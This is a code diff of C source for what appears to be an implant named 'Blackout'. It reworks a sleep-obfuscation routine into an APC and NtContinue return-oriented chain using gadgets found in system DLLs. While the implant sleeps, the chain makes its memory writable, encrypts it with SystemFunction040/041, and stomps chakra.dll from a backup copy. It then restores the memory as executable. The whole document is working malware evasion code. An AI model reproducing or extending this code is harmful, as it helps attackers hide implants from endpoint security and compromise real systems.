@@ -2,8 +2,6 @@
 #include <common.h>
 #include <constexpr.h>
 
-#define MODULE_SIZE( x )      ( (PIMAGE_NT_HEADERS)( (UINT_PTR)x + ( (PIMAGE_DOS_HEADER)x )->e_lfanew ) )->OptionalHeader.SizeOfImage
-
 FUNC VOID volatile ___chkstk_ms(
         VOID
 ) { __asm__( "nop" ); }
@@ -59,23 +57,23 @@ FUNC VOID SleepMain(
     FoliageObf( SleepTime );
 }
 
-FUNC LPVOID lpGetGadgetlpNtTestAlert(
+FUNC PVOID FindNtTestAlertGadget(
     _In_ LPVOID ModuleBase
 ) {
     BLACKOUT_INSTANCE
-    // pattern of "CALL ZwTestAlert" gadget
-    BYTE Pattern[] = { 0x48, 0x83, 0xEC, 0x28, 0xF7, 0x41, 0x04, 0x66, 0x00, 0x00, 0x00, 0x74, 0x05 };
+    BYTE Pattern[] = { 0xE8, 0xF8, 0xF6, 0x02, 0x00 };
 
-    for (SIZE_T i = 0; i < 0x1000*0x1000; i++) {
-        if (Instance()->Win32.RtlCompareMemory( B_PTR( ModuleBase ) + i, Pattern, sizeof( Pattern ) ) == 0) {
-            return (UINT_PTR)ModuleBase + i + 0xd;
+    DWORD ModuleSize = ( (PIMAGE_NT_HEADERS)( ( B_PTR( ModuleBase ) + ( ( PIMAGE_DOS_HEADER )( ModuleBase ) )->e_lfanew ) ) )->OptionalHeader.SizeOfImage;
+
+    for (SIZE_T i = 0; i < ModuleSize; i++) {
+        if (Instance()->Win32.RtlCompareMemory( U_PTR64( ModuleBase ) + i, Pattern, sizeof( Pattern ) ) == sizeof( Pattern ) ) {
+            return U_PTR64( ModuleBase + i );
         }
     }
 
     return NULL;
 }
 
-#ifdef BK_STOMP
 FUNC VOID FoliageObf( 
     DWORD SleepTime
 ) {
@@ -83,126 +81,168 @@ FUNC VOID FoliageObf(
     
     LONG   Status     = 0x00;
 
-    PVOID StackBase  = Instance()->Session.StackBase;
-    PVOID StackLimit = Instance()->Session.StackLimit;
-
     HANDLE EvtSync       = NULL;
     HANDLE hDuplicateObj = NULL;
     HANDLE hSlpThread    = NULL;
     HANDLE hMainThread   = NtCurrentThread();
 
-    CHAR    LibraryFr[]= { 'c', 'h', 'a', 'k', 'r', 'a', '.', 'd', 'l', 'l', 0 }; // todo: string encryption
-    HMODULE hLibraryFr = Instance()->Win32.GetModuleHandleA( LibraryFr );        // todo: get module using LdrModuleAddr | discover hash of the chacrka.dll
+    CHAR    LibraryFr[]= { 'c', 'h', 'a', 'k', 'r', 'a', '.', 'd', 'l', 'l', 0 }; // todo: dynamic get
+    HMODULE hLibraryFr = Instance()->Win32.GetModuleHandleA( LibraryFr );        // todo: get module using LdrModuleAddr | discover hash of the chakra.dll
     PVOID   OldProt    = NULL;
 
-    PVOID  NtTestAlertGdgt = lpGetGadgetlpNtTestAlert( Instance()->Modules.Ntdll );
-    PVOID  JmpGadget = FindGadget( Instance()->Modules.Kernel32 );
-    BK_PRINT( "[I] Using Rbx gadget @ 0x%p\n", JmpGadget );
-
-    
     CONTEXT CtxMain   = { 0 };
     CONTEXT CtxBackup = { 0 };
     CONTEXT CtxSpoof  = { 0 };
 
-    CONTEXT RopSetEvt = { 0 };
-    CONTEXT RopMapBkp = { 0 };
-    CONTEXT RopFdsZzz = { 0 };
-    CONTEXT RopFreeLb = { 0 };
-    CONTEXT RopLoadLb = { 0 };
-    CONTEXT RopGetBkp = { 0 };
-    CONTEXT RopDelay  = { 0 };
-    CONTEXT RopImpBcp = { 0 };
-    CONTEXT RopProtRw = { 0 };
-    CONTEXT RopProtRx = { 0 };
-    CONTEXT RopSetBkp = { 0 };
-    CONTEXT RopExit   = { 0 };
+    UINT16 ic = 0;
+
+    CONTEXT Ctx[10] = { 0 };
 
     Status = Instance()->Win32.NtCreateEvent( &EvtSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE );
     if ( Status != 0x00 ) { __debugbreak; return; }    
 
-    Status = Instance()->Win32.NtCreateThreadEx( &hSlpThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Instance()->Win32.TpReleaseCleanupGroupMembers, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL );
+    Status = Instance()->Win32.NtCreateThreadEx( 
+        &hSlpThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), 
+        Instance()->Win32.TpReleaseCleanupGroupMembers, NULL, TRUE, 
+        0, 0x1000 * 20, 0x1000 * 20, NULL 
+    );
     if ( Status != 0x00 ) { __debugbreak; return; }
 
-    Instance()->Win32.printf( "[I] Obf chain thread at tid: %d\n", hSlpThread );
+    if ( Blackout().Backup ) BK_PRINT( "[OBF] Sleepobf with advanced module stomping\n[OBF] Mapped backup address @ 0x%p\n", Blackout().Backup );
+
+    BK_PRINT( "\n" );
+    BK_PRINT( "[BK] Blackout base address    @ 0x%p [0x%x bytes]\n", Blackout().Region.Base, Blackout().Region.Length );
+    BK_PRINT( "[BK] Blackout Rx base address @ 0x%p [0x%x bytes]\n", Blackout().RxRegion.Base, Blackout().RxRegion.Length );
+    BK_PRINT( "[BK] Blackout Rw base address @ 0x%p [0x%x bytes]\n\n", Blackout().RwRegion.Base, Blackout().RwRegion.Length );
+
+    BK_PRINT( "[OBF] Rbx gadget @ 0x%p\n", Blackout().Gadgets.JmpGadget );
+    BK_PRINT( "[OBF] ret gadget to NtTestAlert @ 0x%p\n", Blackout().Gadgets.RetGadget );
+    BK_PRINT( "[OBF] NtContinue gadget @ 0x%p\n", Blackout().Gadgets.NtContinueGadget );
+    BK_PRINT( "[OBF] SleepObf chain thread at tid: %d\n", hSlpThread );
 
     CtxMain.ContextFlags = CONTEXT_FULL;
     Status = Instance()->Win32.NtGetContextThread( hSlpThread, &CtxMain );
     if ( Status != 0x00 ) { __debugbreak; return; }
 
-    *(PVOID*)CtxMain.Rsp = Instance()->Win32.NtTestAlert;//0x00007FFE7FC044B3;
+    for ( INT i = 0; i < 9; i++ ) {
+        MmCopy( &Ctx[i], &CtxMain, sizeof( CONTEXT ) );
+    }
 
-    MmCopy( &RopSetEvt, &CtxMain, sizeof( CONTEXT ) );
-    MmCopy( &RopMapBkp, &CtxMain, sizeof( CONTEXT ) );
-    MmCopy( &RopFreeLb, &CtxMain, sizeof( CONTEXT ) );
-    MmCopy( &RopLoadLb, &CtxMain, sizeof( CONTEXT ) );
-    MmCopy( &RopFdsZzz, &CtxMain, sizeof( CONTEXT ) );
-    MmCopy( &RopDelay,  &CtxMain, sizeof( CONTEXT ) );
-    MmCopy( &RopProtRx, &CtxMain, sizeof( CONTEXT ) );
-    MmCopy( &RopGetBkp, &CtxMain, sizeof( CONTEXT ) );
-    MmCopy( &RopSetBkp, &CtxMain, sizeof( CONTEXT ) );
-    MmCopy( &RopProtRw, &CtxMain, sizeof( CONTEXT ) );
-    MmCopy( &RopImpBcp, &CtxMain, sizeof( CONTEXT ) );
-    MmCopy( &RopExit,   &CtxMain, sizeof( CONTEXT ) );
+    Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+    Ctx[ic].Rbx = &Instance()->Win32.NtWaitForSingleObject;
+    Ctx[ic].Rcx = EvtSync;
+    Ctx[ic].Rdx = FALSE;
+    Ctx[ic].R9  = NULL;
+    *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+    ic++;
 
-    RopSetEvt.Rip = Instance()->Win32.NtWaitForSingleObject;
-    RopSetEvt.Rcx = EvtSync;
-    RopSetEvt.Rdx = FALSE;
-    RopSetEvt.R9  = NULL;
+    if ( Blackout().Backup ) {
 
-    RopMapBkp.Rip = Instance()->Win32.RtlCopyMemory;
-    RopMapBkp.Rcx = Instance()->StompArgs->Backup;
-    RopMapBkp.Rdx = Instance()->Base.Buffer;
-    RopMapBkp.R8  = Instance()->Base.FullLen;
+        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+        Ctx[ic].Rbx = &Instance()->Win32.RtlCopyMemory;
+        Ctx[ic].Rcx = Blackout().Backup;
+        Ctx[ic].Rdx = Blackout().Region.Base;
+        Ctx[ic].R8  = Blackout().Region.Length;
+        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+        ic++;
 
-    RopFreeLb.Rip = Instance()->Win32.LdrUnloadDll;
-    RopFreeLb.Rcx = hLibraryFr;
-     
-    RopLoadLb.Rip = Instance()->Win32.LoadLibraryExA;
-    RopLoadLb.Rcx = LibraryFr;
-    RopLoadLb.Rdx = NULL;
-    RopLoadLb.R8  = DONT_RESOLVE_DLL_REFERENCES;
+        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+        Ctx[ic].Rbx = &Instance()->Win32.LdrUnloadDll;
+        Ctx[ic].Rcx = hLibraryFr;
+        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+        ic++;
 
-    RopDelay.Rip = Instance()->Win32.WaitForSingleObjectEx;
-    RopDelay.Rcx = NtCurrentProcess();
-    RopDelay.Rdx = SleepTime;
-    RopDelay.R8  = FALSE;
+        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget; 
+        Ctx[ic].Rbx = &Instance()->Win32.LoadLibraryExA; //todo: change to ldrloaddll
+        Ctx[ic].Rcx = LibraryFr;
+        Ctx[ic].Rdx = NULL;
+        Ctx[ic].R8  = DONT_RESOLVE_DLL_REFERENCES;
+        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+        ic++;
+    } else {
+        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+        Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
+        Ctx[ic].Rcx = Blackout().RxRegion.Base;
+        Ctx[ic].Rdx = Blackout().RxRegion.Length;
+        Ctx[ic].R8  = PAGE_READWRITE;
+        Ctx[ic].R9  = &OldProt;
+        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+        ic++;
 
-    RopProtRw.Rip = JmpGadget;
-    RopProtRw.Rbx = &Instance()->Win32.VirtualProtect;
-    RopProtRw.Rcx = Instance()->Base.Buffer;
-    RopProtRw.Rdx = Instance()->Base.FullLen;
-    RopProtRw.R8  = PAGE_READWRITE;
-    RopProtRw.R9  = &OldProt;
+        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+        Ctx[ic].Rbx = &Instance()->Win32.SystemFunction040;
+        Ctx[ic].Rcx = Blackout().Region.Base;
+        Ctx[ic].Rdx = Blackout().Region.Length;
+        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+        ic++;
+    }
 
-    RopImpBcp.Rip = Instance()->Win32.RtlCopyMemory;
-    RopImpBcp.Rcx = Instance()->Base.Buffer;
-    RopImpBcp.Rdx = Instance()->StompArgs->Backup;
-    RopImpBcp.R8  = Instance()->StompArgs->Length;
+    Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+    Ctx[ic].Rbx = &Instance()->Win32.WaitForSingleObjectEx;
+    Ctx[ic].Rcx = NtCurrentProcess();
+    Ctx[ic].Rdx = SleepTime;
+    Ctx[ic].R8  = FALSE;
+    *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+    ic++;
 
-    RopProtRx.Rip = JmpGadget;
-    RopProtRx.Rbx = &Instance()->Win32.VirtualProtect;
-    RopProtRx.Rcx = Instance()->Base.RxBase;
-    RopProtRx.Rdx = Instance()->Base.RxSize;
-    RopProtRx.R8  = PAGE_EXECUTE_READ;
-    RopProtRx.R9  = &OldProt;
+    if ( Blackout().Backup ) {
+        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+        Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
+        Ctx[ic].Rcx = Blackout().Region.Base;
+        Ctx[ic].Rdx = Blackout().Region.Length;
+        Ctx[ic].R8  = PAGE_READWRITE;
+        Ctx[ic].R9  = &OldProt;
+        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+        ic++;
 
-    RopExit.Rip = Instance()->Win32.RtlExitUserThread;
-    RopExit.Rcx = 0x00;
+        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+        Ctx[ic].Rbx = &Instance()->Win32.RtlCopyMemory;
+        Ctx[ic].Rcx = Blackout().Region.Base;
+        Ctx[ic].Rdx = Blackout().Backup;
+        Ctx[ic].R8  = Blackout().Region.Length;
+        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+        ic++;
 
-    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopSetEvt, FALSE, NULL );
-    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopMapBkp, FALSE, NULL );
-    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopFreeLb, FALSE, NULL );
-    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopLoadLb, FALSE, NULL );
-    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopDelay , FALSE, NULL );
-    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopProtRw, FALSE, NULL );
-    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopImpBcp, FALSE, NULL );
-    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopProtRx, FALSE, NULL );
-    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopExit  , FALSE, NULL );
+        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+        Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
+        Ctx[ic].Rcx = Blackout().RxRegion.Base;
+        Ctx[ic].Rdx = Blackout().RxRegion.Length;
+        Ctx[ic].R8  = PAGE_EXECUTE_READ;
+        Ctx[ic].R9  = &OldProt;
+        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+        ic++; 
+    } else {
+        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+        Ctx[ic].Rbx = &Instance()->Win32.SystemFunction041;
+        Ctx[ic].Rcx = Blackout().Region.Base;
+        Ctx[ic].Rdx = Blackout().Region.Length;
+        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+        ic++;
+
+        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+        Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
+        Ctx[ic].Rcx = Blackout().RxRegion.Base;
+        Ctx[ic].Rdx = Blackout().RxRegion.Length;
+        Ctx[ic].R8  = PAGE_EXECUTE_READ;
+        Ctx[ic].R9  = &OldProt;
+        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+        ic++;
+    }
+
+    Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+    Ctx[ic].Rbx = &Instance()->Win32.RtlExitUserThread;
+    Ctx[ic].Rcx = 0x00;
+    *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+    ic++;
+
+    for ( INT i = 0; i < ic; i++ ) {
+        Instance()->Win32.NtQueueApcThread( hSlpThread, Blackout().Gadgets.NtContinueGadget, &Ctx[i], FALSE, NULL );
+    }
 
     Status = Instance()->Win32.NtAlertResumeThread( hSlpThread, NULL );
     if ( Status != 0x00 ) { __debugbreak; return; }
 
-    Instance()->Win32.printf( "[I] Trigger sleep obf chain\n\n" );
+    Instance()->Win32.printf( "[OBF] Trigger sleep obf chain\n\n" );
 
     Status = Instance()->Win32.NtSignalAndWaitForSingleObject( EvtSync, hSlpThread, FALSE, NULL );
     if ( Status != 0x00 ) { __debugbreak; return; }
@@ -219,165 +259,6 @@ _LeaveObf:
     }
 }    
 
-#else
-
-FUNC VOID FoliageObf( 
-    DWORD SleepTime
-) {
-    BLACKOUT_INSTANCE
-    
-    LONG   Status        = 0x00;
-
-    HANDLE EvtSync       = NULL;
-    HANDLE hDuplicateObj = NULL;
-    HANDLE hSlpThread    = NULL;
-    HANDLE hMainThread   = NULL;
-
-    PVOID  OldProt    = NULL;
-    PVOID  Heap       = Instance()->Session.Heap;
-
-    CONTEXT CtxMain   = { 0 };
-    CONTEXT CtxBackup = { 0 };
-    CONTEXT CtxSpoof  = { 0 };
-
-    CONTEXT CtxChain[10] = { 0 };
-
-    CONTEXT RopSetEvt = { 0 };
-    CONTEXT RopProtRw = { 0 };
-    CONTEXT RopMemEnc = { 0 };
-    CONTEXT RopGetCtx = { 0 };
-    CONTEXT RopSetCtx = { 0 };
-    CONTEXT RopDelay  = { 0 };
-    CONTEXT RopMemDec = { 0 };
-    CONTEXT RopProtRx = { 0 };
-    CONTEXT RopFixCtx = { 0 }; 
-    CONTEXT RopExit   = { 0 };
-
-    Status = Instance()->Win32.NtCreateEvent( &EvtSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE );
-    if ( Status != 0x00 )  { __debugbreak; return; }
-
-    Instance()->Win32.DuplicateHandle( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &hDuplicateObj, THREAD_ALL_ACCESS, 0, 0 );
-
-    Status = Instance()->Win32.NtCreateThreadEx( &hSlpThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL );
-    if ( Status != 0x00 ) { __debugbreak; return; }
-
-    Instance()->Win32.printf( "[I] Obf chain thread at tid: %d\n", hSlpThread );
-
-    CtxMain.ContextFlags = CONTEXT_FULL;
-    Status = Instance()->Win32.NtGetContextThread( hSlpThread, &CtxMain );
-    if ( Status != 0x00 ) { __debugbreak; return; }
-
-    *(PVOID*)CtxMain.Rsp = Instance()->Win32.NtTestAlert;
-
-    for ( INT i = 0; i < sizeof( CtxChain ); i++ ) {
-        MmCopy( &CtxChain[i], &CtxMain, sizeof( CONTEXT ) );
-    }
-
-    /* 
-     * wait EvtSync gets triggered
-     * NtWaitForGingleObject( EvtSync, FALSE, NULL ); 
-     */
-    CtxChain[0].Rip = Instance()->Win32.NtWaitForSingleObject;
-    CtxChain[0].Rcx = EvtSync;
-    CtxChain[0].Rdx = FALSE;
-    CtxChain[0].R9  = NULL;
-
-    /*
-     * Change implant protection to RW
-     * VirtualProtect( RxBase, RxSize, PAGE_READWRITE, &OldProt ); 
-     */
-    CtxChain[1].Rip = Instance()->Win32.VirtualProtect;
-    CtxChain[1].Rcx = Instance()->Base.RxBase;
-    CtxChain[1].Rdx = Instance()->Base.RxSize;
-    CtxChain[1].R8  = PAGE_READWRITE;
-    CtxChain[1].R9  = &OldProt;
-
-    /*
-     * memory encryption
-     * SystemFunction040( BaseAddress, FullLength );
-     */
-    CtxChain[2].Rip = Instance()->Win32.SystemFunction040;
-    CtxChain[2].Rcx = Instance()->Base.Buffer;
-    CtxChain[2].Rdx = Instance()->Base.FullLen;
-
-    /*
-     * delay
-     * WaitForSingleObjectEx( NtCurrentProcess(), SleepTime, FALSE );
-     */
-    CtxChain[3].Rip = Instance()->Win32.WaitForSingleObjectEx;
-    CtxChain[3].Rcx = NtCurrentProcess();
-    CtxChain[3].Rdx = SleepTime;
-    CtxChain[3].R8  = FALSE;
-
-    /*
-     * memory decryption
-     * SystemFunction041( BaseAddress, FullLength );
-     */
-    RopMemDec.Rip = Instance()->Win32.SystemFunction041;
-    RopMemDec.Rcx = Instance()->Base.Buffer;
-    RopMemDec.Rdx = Instance()->Base.FullLen;
-
-    /*
-     * 
-     * NtSetContextThread( hDuplicateObj, &CtxBackup );
-     */
-
-    RopFixCtx.Rip = Instance()->Win32.NtSetContextThread;
-    RopFixCtx.Rcx = hDuplicateObj;
-    RopFixCtx.Rdx = &CtxBackup;
-
-    /*
-     * change memory to execute and read
-     * VirtualProtect( RxBase, RxSize, PAGE_EXECUTE_READ, &oldProt );
-     */
-    RopProtRx.Rip = Instance()->Win32.VirtualProtect;
-    RopProtRx.Rcx = Instance()->Base.RxBase;
-    RopProtRx.Rdx = Instance()->Base.RxSize;
-    RopProtRx.R8  = PAGE_EXECUTE_READ;
-    RopProtRx.R9  = &OldProt;
-
-    /*
-     * exit thread
-     * RtlExitUserThread( 0x00 );
-     */
-    RopExit.Rip = Instance()->Win32.RtlExitUserThread;
-    RopExit.Rcx = 0x00;
-
-    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopSetEvt, FALSE, NULL );
-    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopProtRw, FALSE, NULL );
-    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopMemEnc, FALSE, NULL );
-    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopGetCtx, FALSE, NULL );
-    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopSetCtx, FALSE, NULL );
-    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopDelay , FALSE, NULL );
-    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopMemDec, FALSE, NULL );
-    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopProtRx, FALSE, NULL );
-    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopFixCtx, FALSE, NULL );
-    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopExit  , FALSE, NULL );
-
-    Status = Instance()->Win32.NtAlertResumeThread( hSlpThread, NULL );
-    if ( Status != 0x00 ) { __debugbreak; return; }
-    Instance()->Win32.printf( "[I] Trigger sleep obf chain\n\n" );
-
-    HeapObf( Heap );
-
-    Status = pNtSignalAndWaitForSingleObject( EvtSync, hSlpThread, FALSE, NULL );
-    if ( Status != 0x00 ) { __debugbreak; return; }
-
-    HeapObf( Heap );
-
-_LeaveObf:
-    if ( EvtSync ) {
-        Instance()->Win32.CloseHandle( EvtSync );
-        EvtSync = NULL;
-    }
-
-    if ( hSlpThread ) {
-        Instance()->Win32.CloseHandle( hSlpThread );
-        hSlpThread = NULL;
-    }
-}    
-
-#endif
 
 FUNC BOOL CfgCheckEnabled(
     VOID
